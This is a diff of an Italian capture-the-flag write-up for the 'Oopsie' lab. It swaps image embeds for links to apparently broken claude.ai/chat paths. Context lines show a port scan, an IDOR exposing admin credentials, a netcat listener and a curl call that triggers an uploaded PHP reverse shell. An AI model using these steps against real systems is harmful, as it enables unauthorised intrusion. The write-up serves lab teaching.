@@ -39,7 +39,7 @@ sudo nmap -sV -sC -p- Oopsie
 
 Esplorando il sito si trova l'email dell'admin in fondo alla homepage:
 
-![[Pasted image 20260409203228.png]]
+![homepage](https://claude.ai/chat/Pasted%20image%2020260409203228.png)
 
 ---
 
@@ -53,7 +53,7 @@ Trovato nel sorgente della homepage:
 http://oopsie/cdn-cgi/login/
 ```
 
-![[Pasted image 20260409204807.png]]
+![login page](https://claude.ai/chat/Pasted%20image%2020260409204807.png)
 
 Login come **guest** → cookie di sessione esposti:
 
@@ -68,7 +68,7 @@ Navigando con `id=1` si vede l'account admin:
 http://oopsie/cdn-cgi/login/admin.php?content=accounts&id=1
 ```
 
-![[Pasted image 20260409205544.png]]
+![admin panel IDOR](https://claude.ai/chat/Pasted%20image%2020260409205544.png)
 
 - **Access ID admin:** `34322`
 - **Email:** `admin@megacorp.com`
@@ -112,7 +112,7 @@ nc -lvnp 4444
 curl http://Oopsie/uploads/shell.php
 ```
 
-![[Pasted image 20260409211718.png]]
+![reverse shell](https://claude.ai/chat/Pasted%20image%2020260409211718.png)
 
 Shell ottenuta come `www-data` (uid=33).
 
